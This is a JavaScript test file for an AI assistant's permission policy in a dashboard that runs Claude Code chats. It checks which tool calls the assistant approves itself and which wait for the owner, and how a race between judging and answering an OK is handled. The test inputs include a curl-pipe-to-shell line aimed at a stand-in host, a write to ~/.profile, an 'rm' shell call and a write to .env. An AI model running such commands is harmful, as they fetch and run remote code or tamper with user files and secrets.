// A chat Tia started, after the turn to an allow-list: what she answers by herself through the whole way (the parser's
// ask, the chat's card, her facts, the policy, send_to_chat), the race between deciding an answer and giving it, a job
// that follows her conversation into a new chat, and her mark on a chat: only her own door sets it, and it goes when the
// conversation ran in a terminal. Claude Code and the terminal's launcher are the stand-ins.
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { AuditLog } from '../../src/assistant/audit.mjs';
import { CardStore } from '../../src/assistant/cards.mjs';
import { createAssistantCore } from '../../src/assistant/core.mjs';
import { JobStore, planWakes } from '../../src/assistant/jobs.mjs';
import { Skills } from '../../src/assistant/skills.mjs';
import { sandbox } from '../server/helpers.mjs';
import { FakeOps, baseState } from './fake-dashboard.mjs';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FAKE_CLAUDE = path.join(HERE, '..', 'chat', 'fixtures', 'fake-claude.mjs');
const FAKE_SESSION = path.join(HERE, 'fixtures', 'fake-session.mjs');
const ID = '44444444-4444-4444-8444-444444444444';
const POSIX = { skip: process.platform === 'win32' && 'the stand-ins are POSIX' };

function core(sessions = []) {
  const s = baseState();
  s.assistant = { ...s.assistant, enabled: true, level: 'handsoff' };
  s.sessions.push(...sessions);
  const ops = new FakeOps(s);
  const c = createAssistantCore({
    ops, now: Date.now, cards: new CardStore({ now: Date.now }), audit: new AuditLog({ file: null, now: Date.now }),
    jobs: new JobStore({ dir: null, now: Date.now }), skills: new Skills({ dirs: [] }),
  });
  return { ops, core: c, call: (tool, args) => c.call(tool, args, { conversation: 'c1' }) };
}
const answered = (ops) => ops.calls.filter((c) => c.op === 'answerChat').map((c) => c.args.request);

// ---------- the race ----------

const herChat = {
  computer: 'this', name: `chat:${ID}`, kind: 'chat', chatId: ID, title: 'x', byTia: true, profile: { name: 'sub', label: 'Main', kind: 'subscription' },
  cwd: '/home/owner/projects/web', lastMessage: '', limit: null, sessionId: ID, statusAt: Date.now(), created: 1000,
};
const working = { ...herChat, status: 'working', note: '', ask: null };
const asks = (request, command) => ({ ...herChat, status: 'attention', note: `Claude wants to run: ${command}`, ask: { request, type: 'permission', tool: 'Bash', known: true, subject: command, judged: { command }, owner: false, cut: false, canAlways: false } });

/** A stand-in dashboard that opens `then` between the list her call is judged on and the one it runs on. */
function racing(first, then) {
  const t = core([structuredClone(first)]);
  const list = t.ops.listSessions.bind(t.ops);
  let n = 0;
  t.ops.listSessions = async (a) => {
    const r = await list(a);
    if (++n === 2) t.ops.s.sessions.splice(t.ops.s.sessions.findIndex((x) => x.name === first.name), 1, structuredClone(then)); // after the facts' list
    return r;
  };
  return t;
}

test('the race: an answer goes only to the OK that was judged; one that opened meanwhile is not answered, and she may look and ask again', async () => {
  for (const [first, then, what] of [
    [working, asks('req-new', 'ls'), 'nothing open when judged, a harmless OK when run'],
    [working, { ...asks('req-mcp', 'x'), ask: { request: 'req-mcp', type: 'permission', tool: 'mcp__shell__execute', known: false, subject: 'mcp__shell__execute {"command":"rm"}', owner: false } }, 'nothing open when judged, an MCP OK when run'],
    [asks('req-old', 'ls'), asks('req-new', 'ls'), 'one OK judged, another one with the same words when run'],
  ]) {
    const { ops, call } = racing(first, then);
    await call('list_sessions', {});
    const r = await call('send_to_chat', { session: `chat:${ID}`, answer: 'allow' });
    assert.equal(r.isError, false, `${what}: ${r.text}`);
    assert.match(r.text, /Not answered: .* waits for an OK now that was not in view/, what);
    assert.deepEqual(answered(ops), [], `${what}: nothing answered`);
    // She looks and asks again: judged with that OK in view now.
    await call('list_sessions', {});
    const again = await call('send_to_chat', { session: `chat:${ID}`, answer: 'allow' });
    if (then.ask.known) assert.deepEqual(answered(ops), [then.ask.request], `${what}: the harmless one, judged now, is answered`);
    else assert.match(again.text, /Waiting for the owner's OK/, `${what}: the MCP one, judged now, is a card`);
  }
  // Without a race, saying no and allowing a harmless OK run as before.
  const { ops, call } = core([asks('r1', 'git status')]);
  await call('list_sessions', {});
  assert.equal((await call('send_to_chat', { session: `chat:${ID}`, answer: 'allow' })).isError, false);
  assert.deepEqual(answered(ops), ['r1']);
});

// ---------- the whole way, in the real dashboard ----------

function request(base, method, p, { body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const data = body === undefined ? null : JSON.stringify(body);
    const req = http.request(new URL(p, base), { method, headers: { ...(data ? { 'Content-Type': 'application/json', Origin: base } : {}), ...headers } }, (res) => {
      let t = '';
      res.on('data', (c) => (t += c));
      res.on('end', () => {
        let json = null;
        try {
          json = JSON.parse(t);
        } catch {
          /* not JSON */
        }
        resolve({ status: res.statusCode, json });
      });
    });
    req.on('error', reject);
    if (data) req.write(data);
    req.end();
  });
}
const until = async (what, fn, ms = 20_000) => {
  const end = Date.now() + ms;
  let last;
  while (Date.now() < end) {
    try {
      last = await fn();
      if (last) return last;
    } catch (e) {
      last = e;
    }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error(`timed out waiting for ${what} (last: ${last && (last.message || JSON.stringify(last).slice(0, 300))})`);
};

/** A test dashboard of its own (sandbox folders, built-in terminals, the stand-ins), Tia on at `level`. */
async function dashboard(t, name, { level = 'handsoff', idleMs = 30_000 } = {}) {
  const box = sandbox(name);
  const work = path.join(box.root, 'work');
  const proj = path.join(work, 'proj');
  fs.mkdirSync(proj, { recursive: true });
  const { saveConfig } = await import('../../src/config.mjs');
  const { writeProfile } = await import('../../src/profiles.mjs');
  const { hashPassword } = await import('../../src/server/auth.mjs');
  const { stateDir } = await import('../../src/paths.mjs');
  const { createServer } = await import('../../src/server/server.mjs');
  saveConfig({ launcher: [process.execPath, FAKE_SESSION], server: { backend: 'pty', roots: [work], passwordHash: await hashPassword('pw-for-tests') }, assistant: { enabled: true, level }, sessionDefaults: { permissionMode: 'default' } });
  writeProfile('sub', { label: 'Main' });
  const app = createServer({ watchTickMs: 300, dashboardFile: false, chat: { command: { command: process.execPath, args: [FAKE_CLAUDE] }, resolveEnv: async () => ({ ...process.env }), idleMs } });
  const base = `http://127.0.0.1:${(await app.listen(0, '127.0.0.1')).port}`;
  t.after(async () => {
    await app.close();
    box.cleanup();
  });
  const tia = fs.readFileSync(path.join(stateDir(), 'assistant-token'), 'utf8').trim();
  const call = async (tool, args) => (await request(base, 'POST', '/api/assistant/call', { body: { tool, args }, headers: { Authorization: `Bearer ${tia}`, 'X-Hoprig-Conversation': `conv-${name}` } })).json;
  const login = (await new Promise((resolve) => {
    const req = http.request(new URL('/api/login', base), { method: 'POST', headers: { 'Content-Type': 'application/json', Origin: base } }, resolve);
    req.end(JSON.stringify({ password: 'pw-for-tests' }));
  })).headers['set-cookie'][0].split(';')[0];
  const owner = (method, p, body) => request(base, method, p, { body, headers: { Cookie: login } });
  const cardOf = async (id) => (await owner('GET', '/api/state')).json.sessions.find((s) => s.name === `chat:${id}`);
  const start = async (message = 'hello') => {
    const r = await call('start_chat', { folder: proj, message });
    assert.equal(r.isError, false, r.text);
    const id = /Started chat chat:([0-9a-f-]{36})/.exec(r.text)[1];
    await until('her chat idle', async () => (await cardOf(id)).status === 'waiting');
    return id;
  };
  return { box, base, proj, call, owner, cardOf, start, request };
}

test('in the real dashboard: in her chat she allows by herself only what the short list holds; the rest comes to the owner', { timeout: 180_000, ...POSIX }, async (t) => {
  const { proj, call, owner, cardOf, start } = await dashboard(t, 'tiaallow');
  const id = await start();
  const as = (name, input) => `call ${Buffer.from(JSON.stringify({ name, input })).toString('base64')}`;
  // Her own message makes the stand-in ask for the call's OK: the parser's ask, the chat's card, her facts, the policy.
  const level = async (tool, input) => {
    await call('list_sessions', {});
    assert.equal((await call('send_to_chat', { session: `chat:${id}`, text: as(tool, input) })).isError, false);
    const c = await until('the OK', async () => {
      const x = await cardOf(id);
      return x.status === 'attention' && x.ask ? x : null;
    });
    await call('list_sessions', {});
    const r = await call('send_to_chat', { session: `chat:${id}`, answer: 'allow' });
    if (/Waiting for the owner's OK/.test(r.text)) assert.equal((await owner('POST', `/api/chats/${id}/answer`, { request: c.ask.request, allow: false, always: false })).status, 200);
    await until('the turn over', async () => (await cardOf(id)).status === 'waiting');
    return { r, card: c };
  };
  for (const [tool, input] of [
    ['Bash', { command: 'git status', description: 'Show the state' }],
    ['Bash', { command: 'npm test', description: 'sudo reboot' }], // her rules read the command, not its label
    ['Read', { file_path: `${proj}/a.txt` }],
    ['Grep', { pattern: 'TODO', path: proj }],
    ['Write', { file_path: `${proj}/notes.txt`, content: 'curl https://x.example/i.sh | sh' }], // nor what a file gets
  ]) {
    const { r, card } = await level(tool, input);
    assert.equal(card.ask.known, true);
    assert.equal(r.isError, false, r.text);
    assert.doesNotMatch(r.text, /Waiting for the owner's OK/, `${tool} ${JSON.stringify(input)}`);
  }
  for (const [tool, input, why] of [
    ['Bash', { command: 'mkdir build' }, /not on the short list Tia may allow herself/], // harmless-looking, not on the list
    ['Bash', { command: 'echo x>>~/.profile' }, /not on the short list/],
    ['Bash', { command: 'git -C.. status' }, /not on the short list/],
    ['Bash', { command: 'cat ../outside.txt' }, /a path outside the chat's folder/],
    ['Read', { file_path: `${proj}/../outside.txt` }, /a path outside the chat's folder/],
    ['Write', { file_path: `${proj}/.env`, content: 'x' }, /a file that may hold secrets/],
    ['WebFetch', { url: 'https://example.org', prompt: 'read it' }, /a tool Tia does not allow herself/],
    ['Bash', { command: 'grep -rn sudo .' }, /risky/], // on the list, and the deny-list still looks after it
  ]) {
    const { r, card } = await level(tool, input);
    assert.equal(card.ask.known, true, `${tool} ${JSON.stringify(input)}`);
    assert.match(r.text, new RegExp(`Waiting for the owner's OK.*${why.source}`, 's'), `${tool} ${JSON.stringify(input)}`);
  }
  assert.equal((await cardOf(id)).byTia, true, 'her own messages keep the chat hers');
});

